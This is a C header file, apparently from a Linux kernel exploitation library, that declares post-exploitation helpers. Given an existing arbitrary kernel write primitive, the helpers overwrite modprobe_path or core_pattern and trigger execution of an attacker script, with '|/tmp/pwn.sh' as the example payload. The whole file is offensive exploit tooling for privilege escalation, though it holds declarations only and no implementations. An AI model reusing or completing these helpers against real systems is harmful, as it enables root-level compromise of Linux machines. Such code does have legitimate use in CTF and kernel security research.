#ifndef _KPWN_OVERWRITE_
#define _KPWN_OVERWRITE_

#include <stddef.h>
#include <stdint.h>

// Post-exploitation kernel-overwrite targets.
//
// These helpers assume you already have an arbitrary kernel write primitive
// (e.g. from a UAF -> type-confusion -> controlled write). They take a write
// callback and the target offset from kbase.

// Callback types: operate on kernel virtual addresses (uint64_t, NOT void*,
// because kernel addresses are not valid userspace pointers).
typedef int (*kpwn_kwrite_fn)(uint64_t kaddr, const void *data, size_t len,
                              void *ctx);
typedef int (*kpwn_kread_fn)(uint64_t kaddr, void *buf, size_t len, void *ctx);

// Overwrite modprobe_path with a user-controlled path.
// modprobe_path_off: offset of modprobe_path from kbase
// payload_path: path to the script to execute (must be < 256 bytes)
int kpwn_overwrite_modprobe(uint64_t kbase, size_t modprobe_path_off,
                            const char *payload_path, kpwn_kwrite_fn write_fn,
                            void *ctx);

// Trigger modprobe_path execution after overwriting it.
int kpwn_trigger_modprobe(const char *dummy_path);

// Overwrite core_pattern to execute a payload when a process crashes.
// payload_cmd: the command string (e.g. "|/tmp/pwn.sh")
int kpwn_overwrite_core_pattern(uint64_t kbase, size_t core_pattern_off,
                                const char *payload_cmd,
                                kpwn_kwrite_fn write_fn, void *ctx);

#endif
